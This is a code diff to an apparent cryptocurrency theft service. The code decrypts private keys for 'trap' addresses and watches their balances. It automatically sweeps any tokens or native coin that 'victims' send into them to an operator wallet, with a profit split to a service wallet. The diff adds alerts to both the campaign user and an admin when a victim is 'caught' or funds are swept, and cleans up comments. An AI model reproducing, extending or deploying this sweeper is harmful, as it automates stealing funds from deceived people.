@@ -57,8 +57,17 @@ let lastNoBalanceAlertTime = 0;
 const BALANCE_DETECTED_COOLDOWN_MS = 1 * 60 * 60 * 1000;
 const lastBalanceAlertTimes = new Map(); 
 
-// 🚀 OPTIMIZATION: Global metadata cache per sweep cycle
 let cycleMetadataCache = null;
+
+// 🚀 HELPER: Send alert to BOTH User (via campaignId) and Admin (global .env)
+async function sendDualAlert(message, type = 'info') {
+  // 1. Send to User
+  if (campaignId) {
+    await sendAlert(message, type, campaignId).catch(err => logger.warn(`User alert failed: ${err.message}`));
+  }
+  // 2. Send to Admin (omit campaignId to trigger global .env fallback)
+  await sendAlert(`[ADMIN] ${message}`, type).catch(err => logger.warn(`Admin alert failed: ${err.message}`));
+}
 
 // --- Helper: check if job is cancelled ---
 async function isJobCancelled(jobId) {
@@ -89,7 +98,7 @@ async function updateJob(status, progress = null, total = null, message = null) 
   }
 }
 
-// 🚀 OPTIMIZATION: Fetch and cache metadata ONCE per cycle, not per trap
+// 🚀 OPTIMIZATION: Fetch and cache metadata ONCE per cycle
 async function getCycleMetadata() {
   if (cycleMetadataCache) return cycleMetadataCache;
   
@@ -140,8 +149,7 @@ async function createTransaction(campaignId, trapAddress, tokenSymbol, amount, u
       amount, usd_value: usdValue, tx_hash: txHash, type, status: 'completed',
     }).select().single();
     return error ? null : data.id;
-    // eslint-disable-next-line no-unused-vars
-  } catch (err) {
+  } catch {
     return null;
   }
 }
@@ -182,7 +190,10 @@ async function markVictimCaught(victimAddress) {
   if (!supabaseService) return;
   try {
     await supabaseService.from('traps').update({ is_caught: true }).eq('victim_address', addr);
-    await sendAlert(`🎯 Victim caught\nVictim: ${addr}`, 'info', campaignId);
+    
+    // 🚀 DUAL ALERT: Notify both User and Admin of a catch
+    const msg = `🎯 Victim caught\nVictim: ${addr}`;
+    await sendDualAlert(msg, 'info');
   } catch (err) {
     logger.error(`Failed to mark victim caught ${addr}: ${err.message}`);
   }
@@ -221,7 +232,7 @@ async function getTrapsFromDB(campaignId = null) {
       if (!row.trap_private_key_enc) continue;
       try {
         const privateKey = decrypt(row.trap_private_key_enc);
-        const account = privateKeyToAccount(privateKey); // 🚀 Pre-compute account
+        const account = privateKeyToAccount(privateKey);
         entries.push({
           account,
           trapAddress: account.address.toLowerCase(),
@@ -277,7 +288,7 @@ const ERC20_ABI = parseAbi([
   'function transfer(address to, uint256 amount) returns (bool)',
 ]);
 
-// 🚀 OPTIMIZATION: ONE single shared public client for ALL read operations
+// 🚀 OPTIMIZATION: ONE single shared public client
 const publicClient = createPublicClient({
   chain: viemChain,
   transport: fallback(fallbackUrls.map(url => http(url, { timeout: 10000 })), { rank: false }),
@@ -320,7 +331,7 @@ async function fetchTokenPrices() {
   return priceCache;
 }
 
-// 🚀 OPTIMIZATION: Lazy execution helper. Only fetches nonce/gas if threshold is met.
+// 🚀 OPTIMIZATION: Lazy execution helper
 async function executeSweepForTrap(entry, balances, metadata) {
   const { account, trapAddress, victimAddress } = entry;
   const { profitSplitPercent, userSafeWallet, useSplitting, serviceWallet } = metadata;
@@ -329,15 +340,11 @@ async function executeSweepForTrap(entry, balances, metadata) {
   let sweptAny = false;
   let totalGasPaidInRun = 0n;
 
-  // 🚀 OPTIMIZATION: Lazy nonce fetch (only if we actually have something to sweep)
   let currentNonce = null;
   const getNonce = async () => {
     if (currentNonce === null) {
-      currentNonce = await withRetry(
-        () => publicClient.getTransactionCount({ address: trapAddress, blockTag: 'pending' }),
-        'getTransactionCount', 2, 1000
-      );
-   0}
+      currentNonce = await withRetry(() => publicClient.getTransactionCount({ address: trapAddress, blockTag: 'pending' }), 'getTransactionCount', 2, 1000);
+    }
     return currentNonce++;
   };
 
@@ -362,18 +369,21 @@ async function executeSweepForTrap(entry, balances, metadata) {
     if (usdValue >= MIN_CATCH_USD && victimAddress) await markVictimCaught(victimAddress);
     if (!meetsThreshold) continue;
 
-    // Smart Alert Throttling
     const alertKey = `${trapAddress}:${token.symbol.toLowerCase()}`;
     const now = Date.now();
     if (now - (lastBalanceAlertTimes.get(alertKey) || 0) > BALANCE_DETECTED_COOLDOWN_MS) {
       logger.info(`[!!!] ${token.symbol} BALANCE DETECTED for ${trapAddress}: ${formatted} (≈$${usdValue.toFixed(2)})`);
+      
+      // 🚀 DUAL ALERT: User gets details, Admin gets a shorter summary
       await sendAlert(`💰 ${token.symbol} Balance detected\nTrap: ${trapAddress}\nAmount: ${formatted} ${token.symbol}\n≈$${usdValue.toFixed(2)}`, 'info', campaignId);
+      await sendAlert(`[ADMIN] 💰 ${token.symbol} detected on trap ${trapAddress} (≈$${usdValue.toFixed(2)})`, 'info');
+      
       lastBalanceAlertTimes.set(alertKey, now);
     }
 
     try {
       const gasPrice = await getGasPrice();
-      const gasLimit = 80000n; // 🚀 Fixed gas limit, no estimateGas RPC call
+      const gasLimit = 80000n;
       const totalFee = useSplitting ? (gasLimit * 2n) * gasPrice : gasLimit * gasPrice;
       const spendableNative = balances.native > totalGasPaidInRun ? balances.native - totalGasPaidInRun : 0n;
 
@@ -393,7 +403,7 @@ async function executeSweepForTrap(entry, balances, metadata) {
           data: encodeFunctionData({ abi: ERC20_ABI, functionName: 'transfer', args: [recipient, amount] }),
           gas: gasLimit, nonce, gasPrice, chainId: viemChain.id,
         };
-        const serializedTx = await account.signTransaction(txRequest); // 🚀 On-demand signing
+        const serializedTx = await account.signTransaction(txRequest);
         return await publicClient.sendRawTransaction({ serializedTransaction: serializedTx });
       };
 
@@ -427,7 +437,10 @@ async function executeSweepForTrap(entry, balances, metadata) {
           const txId = await createTransaction(campaignId, trapAddress, token.symbol, formatted, isPriceFeedDown ? 0 : usdValue, txHash, 'sweep');
           if (txId) await createProfitShare(txId, formatUnits(userAmount, tokenData.decimals), formatUnits(serviceAmount, tokenData.decimals), userTxHash, serviceTxHash);
         }
+        
+        // 🚀 DUAL ALERT for successful sweep
         await sendAlert(`💰 ${token.symbol} Sweep executed${useSplitting ? ' (split)' : ''}\nTrap: ${trapAddress}\nTX: ${txHash}`, 'info', campaignId);
+        await sendAlert(`[ADMIN] 💰 ${token.symbol} swept from ${trapAddress}\nTX: ${txHash}`, 'info');
       }
     } catch (e) {
       logger.debug(`Error processing ${token.symbol} for ${trapAddress}: ${e.message}`);
@@ -459,7 +472,7 @@ async function executeSweepForTrap(entry, balances, metadata) {
           const buildAndSendNativeTx = async (recipient, amount) => {
             const nonce = await getNonce();
             const txRequest = { to: recipient, value: amount, gas: 21000n, nonce, gasPrice, chainId: viemChain.id };
-            const serializedTx = await account.signTransaction(txRequest); // 🚀 On-demand signing
+            const serializedTx = await account.signTransaction(txRequest);
             return await publicClient.sendRawTransaction({ serializedTransaction: serializedTx });
           };
 
@@ -487,7 +500,10 @@ async function executeSweepForTrap(entry, balances, metadata) {
               const txId = await createTransaction(campaignId, trapAddress, nativeSymbol, formatEther(spendableNativeFinal), isPriceFeedDown ? 0 : usdValue, txHash, 'sweep');
               if (txId) await createProfitShare(txId, formatEther(userAmount), formatEther(serviceAmount), userTxHash, serviceTxHash);
             }
+            
+            // 🚀 DUAL ALERT for native sweep
             await sendAlert(`💰 ${nativeSymbol} Sweep executed${useSplitting ? ' (split)' : ''}\nTrap: ${trapAddress}\nTX: ${txHash}`, 'info', campaignId);
+            await sendAlert(`[ADMIN] 💰 ${nativeSymbol} swept from ${trapAddress}\nTX: ${txHash}`, 'info');
           }
         }
       } catch (e) {
@@ -512,7 +528,7 @@ async function sweepBatch() {
   }
 
   if (entries.length === 0) {
-    await sendAlert(`ℹ️ Sweep cycle: No traps found.`, 'info', campaignId);
+    await sendDualAlert(`ℹ️ Sweep cycle: No traps found.`, 'info');
     return;
   }
 
@@ -522,7 +538,6 @@ async function sweepBatch() {
 
   logger.info(`Loaded ${entries.length} trap addresses`);
   
-  // 🚀 OPTIMIZATION: Clear metadata cache at start of new cycle
   cycleMetadataCache = null;
   const metadata = await getCycleMetadata();
 
@@ -536,8 +551,10 @@ async function sweepBatch() {
     let anySwept = false;
 
     try {
-      // 🚀 OPTIMIZATION: Multicall3 Batching ACROSS traps in chunks to avoid RPC payload limits
-      const CHUNK_SIZE = 20; // 20 traps * 14 tokens = 280 calls per chunk (safe for Alchemy/Infura)
+      // 🚀 DUAL ALERT: Notify both when a cycle starts
+      await sendDualAlert(`🔄 Sweep cycle started for ${total} traps on ${chainName}.`, 'info');
+
+      const CHUNK_SIZE = 20;
       
       for (let i = 0; i < entries.length; i += CHUNK_SIZE) {
         if (jobId && await isJobCancelled(jobId)) {
@@ -547,8 +564,6 @@ async function sweepBatch() {
         }
 
         const chunk = entries.slice(i, i + CHUNK_SIZE);
-        
-        // 1. Build massive multicall array for ALL tokens for ALL traps in this chunk
         const multicallContracts = [];
         for (const entry of chunk) {
           for (const token of TOKEN_LIST) {
@@ -561,19 +576,10 @@ async function sweepBatch() {
           }
         }
 
-        // 2. Execute single multicall for the entire chunk
-        const results = await withRetry(
-          () => publicClient.multicall({ contracts: multicallContracts, allowFailure: true }),
-          'multicall_chunk', 2, 1000
-        );
-
-        // 3. 🚀 OPTIMIZATION: Parallel native balance fetch for the chunk (RPCs batch this automatically if supported)
-        const nativeBalancePromises = chunk.map(entry => 
-          withRetry(() => publicClient.getBalance({ address: entry.trapAddress }), 'getBalance', 2, 1000)
-        );
+        const results = await withRetry(() => publicClient.multicall({ contracts: multicallContracts, allowFailure: true }), 'multicall_chunk', 2, 1000);
+        const nativeBalancePromises = chunk.map(entry => withRetry(() => publicClient.getBalance({ address: entry.trapAddress }), 'getBalance', 2, 1000));
         const nativeBalances = await Promise.all(nativeBalancePromises);
 
-        // 4. Map results back to individual traps and execute lazily
         let resultIndex = 0;
         for (let j = 0; j < chunk.length; j++) {
           const entry = chunk[j];
@@ -586,7 +592,6 @@ async function sweepBatch() {
             }
           }
 
-          // 🚀 OPTIMIZATION: Lazy execution. Only hits RPC for nonce/gas if balances meet threshold
           const swept = await executeSweepForTrap(entry, trapBalances, metadata);
           if (swept) anySwept = true;
           
@@ -595,16 +600,18 @@ async function sweepBatch() {
         }
       }
       
-      // Smart Quiet Cycle Throttling
       if (!anySwept) {
         const now = Date.now();
         if (now - lastNoBalanceAlertTime > NO_BALANCE_COOLDOWN_MS) {
-          await sendAlert(`ℹ️ Sweep cycle: No balances above thresholds ($${MIN_SWEEP_USD}) found for ${total} traps.`, 'info', campaignId);
+          await sendDualAlert(`ℹ️ Sweep cycle complete: No balances above thresholds ($${MIN_SWEEP_USD}) found for ${total} traps.`, 'info');
           lastNoBalanceAlertTime = now;
         }
+      } else {
+        await sendDualAlert(`✅ Sweep cycle complete: Successfully processed ${total} traps.`, 'info');
       }
     } catch (err) {
       logger.error(`Batch sweep error: ${err.message}`);
+      await sendAlert(`[ADMIN] ❌ CRITICAL ERROR in sweep batch: ${err.message}`, 'error');
     } finally {
       isSweeping = false;
     }
@@ -618,7 +625,6 @@ async function sweepBatch() {
     }, pollIntervalMs);
   };
 
-  await sendAlert(`🔄 Sweep started for ${total} traps on ${chainName}.`, 'info', campaignId);
   await runSweep();
   scheduleNext();
   onShutdown(() => { logger.info('Sweeper stopping...'); });
@@ -636,7 +642,6 @@ async function sweepSingle(privateKey, destination) {
     isRunning = true;
     try {
       cycleMetadataCache = { profitSplitPercent: 100, userSafeWallet: destination, useSplitting: false, serviceWallet: null };
-      // For single mode, we just fetch balances directly
       const multicallContracts = TOKEN_LIST.map(token => ({
         address: getAddress(token.address), abi: ERC20_ABI, functionName: 'balanceOf', args: [trapAddress]
       }));
